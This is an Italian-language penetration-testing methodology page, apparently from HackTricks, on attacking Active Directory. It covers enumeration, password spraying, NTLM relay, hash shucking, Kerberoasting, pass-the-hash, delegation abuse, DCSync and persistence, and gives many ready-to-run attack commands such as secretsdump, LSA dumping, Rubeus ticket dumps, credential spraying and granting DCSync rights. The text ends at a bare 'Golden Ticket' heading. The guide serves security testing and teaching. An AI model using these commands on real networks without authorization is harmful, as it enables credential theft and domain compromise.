# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Panoramica di base

**Active Directory** funge da tecnologia fondamentale, consentendo agli **amministratori di rete** di creare e gestire in modo efficiente **domains**, **users** e **objects** all'interno di una rete. È progettato per scalare, facilitando l'organizzazione di un numero esteso di utenti in **groups** e **subgroups** gestibili, controllando al contempo i **diritti di accesso** a vari livelli.

La struttura di **Active Directory** è composta da tre livelli principali: **domains**, **trees** e **forests**. Un **domain** comprende una raccolta di oggetti, come **users** o **devices**, che condividono un database comune. I **trees** sono gruppi di questi domain collegati da una struttura condivisa, e una **forest** rappresenta la raccolta di più trees, interconnessi tramite **trust relationships**, formando il livello più alto della struttura organizzativa. Specifici **diritti di accesso** e di **comunicazione** possono essere definiti a ciascuno di questi livelli.

I concetti chiave all'interno di **Active Directory** includono:

1. **Directory** – Contiene tutte le informazioni relative agli oggetti di Active Directory.
2. **Object** – Indica entità all'interno della directory, inclusi **users**, **groups** o **shared folders**.
3. **Domain** – Funziona come contenitore per gli oggetti della directory, con la possibilità per più domain di coesistere all'interno di una **forest**, ciascuno mantenendo la propria raccolta di oggetti.
4. **Tree** – Un raggruppamento di domain che condividono un domain radice comune.
5. **Forest** – Il vertice della struttura organizzativa in Active Directory, composta da diversi trees con **trust relationships** tra loro.

**Active Directory Domain Services (AD DS)** comprende una gamma di servizi fondamentali per la gestione centralizzata e la comunicazione all'interno di una rete. Questi servizi includono:

1. **Domain Services** – Centralizza l'archiviazione dei dati e gestisce le interazioni tra **users** e **domains**, incluse le funzionalità di **authentication** e **search**.
2. **Certificate Services** – Supervisiona la creazione, distribuzione e gestione di **digital certificates** sicuri.
3. **Lightweight Directory Services** – Supporta applicazioni abilitate alla directory tramite il **LDAP protocol**.
4. **Directory Federation Services** – Fornisce funzionalità di **single-sign-on** per autenticare gli utenti su più applicazioni web in un'unica sessione.
5. **Rights Management** – Aiuta a proteggere materiale coperto da copyright regolando la sua distribuzione e il suo uso non autorizzati.
6. **DNS Service** – Fondamentale per la risoluzione dei **domain names**.

Per una spiegazione più dettagliata consulta: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Per imparare come **attaccare un AD** devi **capire** molto bene il **Kerberos authentication process**.\
[**Leggi questa pagina se ancora non sai come funziona.**](kerberos-authentication.md)

## Cheat Sheet

Puoi usare molto [https://wadcoms.github.io/](https://wadcoms.github.io) per avere una vista rapida dei comandi che puoi eseguire per enumerare/exploitare un AD.

> [!WARNING]
> La comunicazione Kerberos **richiede un nome completo qualificato (FQDN)** per eseguire le azioni. Se provi ad accedere a una macchina tramite indirizzo IP, **userà NTLM e non kerberos**.

## Recon Active Directory (No creds/sessions)

Se hai solo accesso a un ambiente AD ma non hai alcuna credenziale/sessione, potresti:

- **Pentest the network:**
- Scansiona la rete, trova macchine e porte aperte e prova a **exploitare vulnerabilities** o **estrarre credentials** da esse (per esempio, [le printers potrebbero essere target molto interessanti](ad-information-in-printers.md).
- Enumerare il DNS potrebbe fornire informazioni su server chiave nel domain come web, printers, shares, vpn, media, ecc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dai un'occhiata alla generale [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) per trovare ulteriori informazioni su come fare questo.
- **Verifica l'accesso null e Guest sui servizi smb** (questo non funzionerà sulle versioni moderne di Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guida più dettagliata su come enumerare un server SMB si può trovare qui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumera Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guida più dettagliata su come enumerare LDAP si può trovare qui (presta **attenzione speciale all'accesso anonimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Raccogli credentials [**impersonando servizi con Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accedi all'host sfruttando [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Raccogli credentials **esponendo** [**fake UPnP services con evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Estrai username/nomi da documenti interni, social media, servizi (principalmente web) all'interno degli ambienti del domain e anche da fonti pubblicamente disponibili.
- Se trovi i nomi completi dei dipendenti dell'azienda, puoi provare diversi **username conventions (**[**leggi questo**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Le convenzioni più comuni sono: _NameSurname_, _Name.Surname_, _NamSur_ (3 lettere di ciascuno), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettere casuali e 3 numeri casuali_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Consulta le pagine [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando viene richiesta un **invalid username** il server risponderà usando il codice di errore **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, consentendoci di determinare che il username non era valido. I **valid usernames** provocheranno oppure il **TGT in una risposta AS-REP** oppure l'errore _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando che l'utente deve eseguire la pre-authentication.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contro l'interfaccia MS-NRPC (Netlogon) sui domain controller. Il metodo chiama la funzione `DsrGetDcNameEx2` dopo aver associato l'interfaccia MS-NRPC per verificare se l'utente o il computer esiste senza alcuna credenziale. Lo strumento [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa questo tipo di enumerazione. La ricerca si può trovare [qui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Server OWA (Outlook Web Access)**

Se hai trovato uno di questi server nella rete puoi anche eseguire **user enumeration** contro di esso. Ad esempio, potresti usare lo strumento [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puoi trovare elenchi di nomi utente in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  e in questo ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tuttavia, dovresti avere il **nome delle persone che lavorano nell'azienda** dal passo di recon che avresti dovuto eseguire prima di questo. Con nome e cognome potresti usare lo script [**namemash.py**](https://gist.github.com/superkojiman/11076951) per generare potenziali nomi utente validi.

### Conoscere uno o più nomi utente

Ok, quindi sai di avere già un nome utente valido ma nessuna password... Allora prova:

- [**ASREPRoast**](asreproast.md): Se un utente **non ha** l'attributo _DONT_REQ_PREAUTH_, puoi **richiedere un messaggio AS_REP** per quell'utente che conterrà alcuni dati cifrati da una derivazione della password dell'utente.
- [**Password Spraying**](password-spraying.md): Proviamo le password più **comuni** con ciascuno degli utenti scoperti, magari qualche utente usa una password debole (tieni presente la password policy!).
- Nota che puoi anche **sprayare i server OWA** per provare ad accedere ai server di posta degli utenti.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Potresti essere in grado di **ottenere** alcuni **hash** challenge da crackare **poisoning** alcuni protocolli della **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se sei riuscito a enumerare l'active directory, avrai **più email e una migliore comprensione della network**. Potresti essere in grado di forzare **relay attacks** NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  per ottenere accesso all'AD env.

### NetExec workspace-driven recon & relay posture checks

- Usa i **`nxcdb` workspaces** per mantenere lo stato della recon AD per ogni engagement: `workspace create <name>` crea DB SQLite separati per protocollo sotto `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia vista con `proto smb|mssql|winrm` ed elenca i secret raccolti con `creds`. Elimina manualmente i dati sensibili quando hai finito: `rm -rf ~/.nxc/workspaces/<name>`.
- La scoperta rapida della subnet con **`netexec smb <cidr>`** mostra **domain**, **OS build**, **requisiti di SMB signing** e **Null Auth**. I membri che mostrano `(signing:False)` sono **relay-prone**, mentre i DC spesso richiedono signing.
- Genera **hostname in /etc/hosts** direttamente dall'output di NetExec per facilitare il targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando il **relay SMB verso il DC è bloccato** dal signing, verifica comunque la postura **LDAP**: `netexec ldap <dc>` evidenzia `(signing:None)` / channel binding debole. Un DC con SMB signing richiesto ma LDAP signing disabilitato resta un target valido per **relay-to-LDAP** per abusi come **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Le interfacce printer/web a volte **incorporano password admin mascherate in HTML**. Visualizzare sorgente/devtools può rivelare il testo in chiaro (ad esempio, `<input value="<password>">`), consentendo accesso Basic-auth per scansionare/restituire i repository.
- I print job recuperati possono contenere **documenti di onboarding in plaintext** con password per singolo utente. Mantieni gli abbinamenti allineati quando testi:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Se puoi **accedere ad altri PC o share** con l’**utente null o guest** potresti **mettere file** (come un file SCF) che, se accessi in qualche modo, **attiveranno un’autenticazione NTLM verso di te** così puoi **rubare** la **sfida NTLM** per crackarla:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tratta ogni NT hash che possiedi già come una password candidata per altri formati più lenti il cui materiale di chiave deriva direttamente dall’NT hash. Invece di brute-forcing lunghe passphrase nei ticket Kerberos RC4, nelle sfide NetNTLM o nelle credenziali cached, alimenti gli NT hash nei modi NT-candidate di Hashcat e lasci che validino il riuso della password senza mai conoscere il plaintext. Questo è particolarmente potente dopo una compromissione di dominio, dove puoi raccogliere migliaia di NT hash correnti e storici.

Usa shucking quando:

- Hai un corpus NT da DCSync, dump SAM/SECURITY o credential vaults e devi testare il riuso in altri domini/foreste.
- Catturi materiale Kerberos basato su RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), risposte NetNTLM o blob DCC/DCC2.
- Vuoi dimostrare rapidamente il riuso per passphrase lunghe e impossibili da crackare e fare subito pivot tramite Pass-the-Hash.

La tecnica **non funziona** contro tipi di cifratura le cui chiavi non sono l’NT hash (ad esempio, Kerberos etype 17/18 AES). Se un dominio impone solo AES, devi tornare ai normali modi password.

#### Building an NT hash corpus

- **DCSync/NTDS** – Usa `secretsdump.py` con history per ottenere il set più grande possibile di NT hash (e i loro valori precedenti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Le voci di history ampliano enormemente il pool di candidati perché Microsoft può memorizzare fino a 24 hash precedenti per account. Per altri modi di raccogliere i segreti NTDS vedi:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oppure Mimikatz `lsadump::sam /patch`) estrae i dati locali SAM/SECURITY e i logon di dominio cached (DCC/DCC2). Rimuovi i duplicati e aggiungi quegli hash alla stessa lista `nt_candidates.txt`.
- **Track metadata** – Conserva username/domain che ha prodotto ogni hash (anche se la wordlist contiene solo hex). Gli hash corrispondenti ti dicono subito quale principal sta riutilizzando una password quando Hashcat stampa il candidato vincente.
- Preferisci candidati dallo stesso forest o da un forest trusted; massimizza la probabilità di overlap durante lo shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- Gli input NT-candidate **devono rimanere NT hash raw a 32 hex**. Disabilita i rule engines (nessun `-r`, nessun hybrid mode) perché le modifiche corrompono il materiale della chiave candidato.
- Questi modi non sono intrinsecamente più veloci, ma lo spazio chiave NTLM (~30,000 MH/s su un M3 Max) è ~100× più rapido di Kerberos RC4 (~300 MH/s). Testare una lista NT curata è molto meno costoso che esplorare l’intero spazio password nel formato lento.
- Esegui sempre la **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) perché i mode 31500/31600/35300/35400 sono stati introdotti di recente.
- Al momento non esiste un modo NT per AS-REQ Pre-Auth, e gli etype AES (19600/19700) richiedono la password in plaintext perché le loro chiavi derivano tramite PBKDF2 da password UTF-16LE, non da NT hash raw.

#### Example – Kerberoast RC4 (mode 35300)

1. Cattura un TGS RC4 per uno SPN target con un utente a basso privilegio (vedi la pagina Kerberoast per i dettagli):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck il ticket con la tua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la chiave RC4 da ogni NT candidate e valida il blob `$krb5tgs$23$...`. Una corrispondenza conferma che l’account di servizio usa uno dei tuoi NT hash esistenti.

3. Fai subito pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Se necessario, puoi opzionalmente recuperare il plaintext in seguito con `hashcat -m 1000 <matched_hash> wordlists/`.

#### Example – Cached credentials (mode 31600)

1. Estrai i logon cached da una workstation compromessa:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la riga DCC2 per l’utente di dominio interessante in `dcc2_highpriv.txt` e shuckala:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Un match riuscito restituisce l’NT hash già noto nella tua lista, dimostrando che l’utente cached sta riutilizzando una password. Usalo direttamente per PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oppure brute-forzalo in fast NTLM mode per recuperare la stringa.

Lo stesso identico workflow si applica alle challenge-response NetNTLM (`-m 27000/27100`) e a DCC (`-m 31500`). Una volta identificato un match puoi avviare relay, SMB/WMI/WinRM PtH, oppure re-crackare l’NT hash offline con masks/rules.



## Enumerating Active Directory WITH credentials/session

Per questa fase devi aver **compromesso le credenziali o una sessione di un account di dominio valido.** Se hai credenziali valide o una shell come domain user, **devi ricordare che le opzioni indicate prima sono ancora opzioni per compromettere altri utenti**.

Prima di iniziare l’enumerazione autenticata dovresti conoscere il **Kerberos double hop problem**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Aver compromesso un account è un **grande passo per iniziare a compromettere l’intero dominio**, perché sarai in grado di iniziare la **Active Directory Enumeration:**

Per quanto riguarda [**ASREPRoast**](asreproast.md) ora puoi trovare ogni possibile utente vulnerabile, e per quanto riguarda [**Password Spraying**](password-spraying.md) puoi ottenere un **elenco di tutti gli username** e provare la password dell’account compromesso, password vuote e nuove password promettenti.

- Puoi usare il [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Puoi anche usare [**powershell for recon**](../basic-powershell-for-pentesters/index.html) che sarà più stealthy
- Puoi anche [**use powerview**](../basic-powershell-for-pentesters/powerview.md) per estrarre informazioni più dettagliate
- Un altro tool eccezionale per la recon in active directory è [**BloodHound**](bloodhound.md). Non è **molto stealthy** (a seconda dei metodi di raccolta che usi), ma **se non ti interessa** dovresti assolutamente provarlo. Trova dove gli utenti possono fare RDP, trova i path verso altri gruppi, ecc.
- **Altri tool automatizzati di AD enumeration sono:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) perché potrebbero contenere informazioni interessanti.
- Un **tool con GUI** che puoi usare per enumerare la directory è **AdExplorer.exe** della suite **SysInternal**.
- Puoi anche cercare nel database LDAP con **ldapsearch** per trovare credenziali nei campi _userPassword_ & _unixUserPassword_, o anche in _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) per altri metodi.
- Se stai usando **Linux**, puoi anche enumerare il dominio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Puoi anche provare tool automatizzati come:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

È molto facile ottenere tutti gli username del dominio da Windows (`net user /domain` ,`Get-DomainUser` o `wmic useraccount get name,sid`). In Linux, puoi usare: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oppure `enum4linux -a -u "user" -p "password" <DC IP>`

> Anche se questa sezione Enumeration sembra piccola è la parte più importante di tutte. Accedi ai link (soprattutto quelli di cmd, powershell, powerview e BloodHound), impara come enumerare un dominio e fai pratica finché non ti senti a tuo agio. Durante un assessment, questo sarà il momento chiave per trovare la strada verso DA o decidere che non si può fare nulla.

### Kerberoast

Kerberoasting consiste nell’ottenere **ticket TGS** usati da servizi associati ad account utente e nel crackare la loro cifratura—which is based on user passwords—**offline**.

Più informazioni qui:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Una volta ottenute alcune credenziali puoi verificare se hai accesso a qualche **macchina**. Per questo, puoi usare **CrackMapExec** per tentare la connessione a diversi server con protocolli diversi, in base alle tue scansioni delle porte.

### Local Privilege Escalation

Se hai compromesso credenziali o una sessione come domain user regolare e hai **accesso** con questo utente a **qualsiasi macchina nel dominio** dovresti cercare di trovare il modo di **escalare localmente i privilegi e raccogliere credenziali**. Questo perché solo con privilegi di local administrator potrai **dumpare gli hash di altri utenti** in memoria (LSASS) e localmente (SAM).

C’è una pagina completa in questo libro su [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e una [**checklist**](../checklist-windows-privilege-escalation.md). Inoltre, non dimenticare di usare [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

È **molto improbabile** che tu trovi **ticket** nella current user **che ti danno il permesso di accedere** a risorse inattese, ma puoi controllare:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se sei riuscito a enumerare active directory avrai **più email e una migliore comprensione della rete**. Potresti riuscire a forzare **relay attacks** [NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Cerca Creds nelle Condivisioni del Computer | SMB Shares

Ora che hai alcune credenziali di base dovresti controllare se riesci a **trovare** qualche **file interessante condiviso all'interno dell'AD**. Potresti farlo manualmente, ma è un compito molto noioso e ripetitivo (e ancora di più se trovi centinaia di documenti da controllare).

[**Segui questo link per conoscere gli strumenti che potresti usare.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se puoi **accedere ad altri PC o share** potresti **piazzare file** (come un file SCF) che, se in qualche modo accesso, faranno t**rigger an NTLM authentication against you** così puoi **rubare** la **NTLM challenge** e craccarla:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Questa vulnerabilità permetteva a qualsiasi utente autenticato di **compromettere il domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Per le seguenti tecniche, un normale domain user non basta: servono privilegi/credenziali speciali per eseguire questi attacchi.**

### Hash extraction

Sperabilmente sei riuscito a **compromettere qualche account di local admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Poi è il momento di dumpare tutti gli hash in memoria e in locale.\
[**Leggi questa pagina sui diversi modi per ottenere gli hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una volta che hai l'hash di un utente**, puoi usarlo per **impersonarlo**.\
Devi usare qualche **tool** che **eseguirà** l'**autenticazione NTLM usando** quell'**hash**, **oppure** puoi creare un nuovo **sessionlogon** e **iniettare** quell'**hash** dentro **LSASS**, così quando viene eseguita qualsiasi **autenticazione NTLM**, verrà usato quell'**hash**. L'ultima opzione è quella che fa mimikatz.\
[**Leggi questa pagina per maggiori informazioni.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Questo attacco mira a **usare l'hash NTLM dell'utente per richiedere ticket Kerberos**, come alternativa al comune Pass The Hash sul protocollo NTLM. Pertanto, può essere particolarmente **utile in reti dove il protocollo NTLM è disabilitato** e solo **Kerberos è consentito** come protocollo di autenticazione.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Nel metodo di attacco **Pass The Ticket (PTT)**, gli attacker **rubano il ticket di autenticazione di un utente** invece della sua password o dei valori hash. Questo ticket rubato viene poi usato per **impersonare l'utente**, ottenendo accesso non autorizzato a risorse e servizi all'interno di una rete.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se hai l'**hash** o la **password** di un **local administrato**r dovresti provare a **effettuare il login localmente** su altri **PC** con esso.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Nota che questo è piuttosto **rumoroso** e **LAPS** lo **mitigherebbe**.

### MSSQL Abuse & Trusted Links

Se un utente ha privilegi per **accedere a istanze MSSQL**, potrebbe essere in grado di usarle per **eseguire comandi** sull'host MSSQL (se in esecuzione come SA), **rubare** l'hash **NetNTLM** o persino eseguire un **relay attack**.\
Inoltre, se un'istanza MSSQL è trusted (database link) da un'altra istanza MSSQL. Se l'utente ha privilegi sul database trusted, sarà in grado di **usare la relazione di trust per eseguire query anche nell'altra istanza**. Questi trust possono essere concatenati e, a un certo punto, l'utente potrebbe trovare un database misconfigurato in cui può eseguire comandi.\
**I link tra database funzionano anche attraverso forest trust.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Le suite di inventario e deployment di terze parti spesso espongono percorsi potenti verso credenziali ed esecuzione di codice. Vedi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se trovi qualsiasi oggetto Computer con l'attributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e hai privilegi di dominio sul computer, sarai in grado di dumpare i TGT dalla memoria di ogni utente che effettua il login sul computer.\
Quindi, se un **Domain Admin effettua il login sul computer**, sarai in grado di dumpare il suo TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Grazie alla constrained delegation potresti persino **compromettere automaticamente un Print Server** (sperando che sia un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se a un utente o computer è consentita la "Constrained Delegation", sarà in grado di **impersonare qualsiasi utente per accedere ad alcuni servizi in un computer**.\
Poi, se **comprometti l'hash** di questo utente/computer sarai in grado di **impersonare qualsiasi utente** (anche domain admin) per accedere ad alcuni servizi.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avere il privilegio **WRITE** su un oggetto Active Directory di un computer remoto consente di ottenere code execution con **privilegi elevati**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utente compromesso potrebbe avere alcuni **privilegi interessanti su alcuni oggetti di dominio** che potrebbero permetterti di **muoverti** lateralmente/**escalare** privilegi.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Individuare un **servizio Spool in ascolto** all'interno del dominio può essere **abusato** per **ottenere nuove credenziali** ed **escalare privilegi**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Se **altri utenti** **accedono** alla macchina **compromessa**, è possibile **raccogliere credenziali dalla memoria** e persino **iniettare beacon nei loro processi** per impersonarli.\
Di solito gli utenti accedono al sistema tramite RDP, quindi qui hai come eseguire un paio di attacchi su sessioni RDP di terze parti:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornisce un sistema per gestire la **password dell'Administrator locale** sui computer joinati al dominio, assicurando che sia **randomizzata**, unica e cambiata frequentemente. Queste password sono archiviate in Active Directory e l'accesso è controllato tramite ACL solo per gli utenti autorizzati. Con permessi sufficienti per accedere a queste password, diventa possibile pivotare verso altri computer.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Raccogliere certificati** dalla macchina compromessa potrebbe essere un modo per escalare privilegi all'interno dell'ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se sono configurati **template vulnerabili** è possibile abusarne per escalare privilegi:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una volta ottenuti privilegi **Domain Admin** o, ancora meglio, **Enterprise Admin**, puoi **dumpare** il **database di dominio**: _ntds.dit_.

[**Ulteriori informazioni sull'attacco DCSync sono disponibili qui**](dcsync.md).

[**Ulteriori informazioni su come rubare NTDS.dit sono disponibili qui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Alcune delle tecniche discusse prima possono essere usate per la persistenza.\
Per esempio potresti:

- Rendere gli utenti vulnerabili a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendere gli utenti vulnerabili a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Concedere privilegi [**DCSync**](#dcsync) a un utente

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'**Silver Ticket attack** crea un **ticket Ticket Granting Service (TGS) legittimo** per un servizio specifico usando l'**hash NTLM** (per esempio, l'**hash dell'account del PC**). Questo metodo viene impiegato per **accedere ai privilegi del servizio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

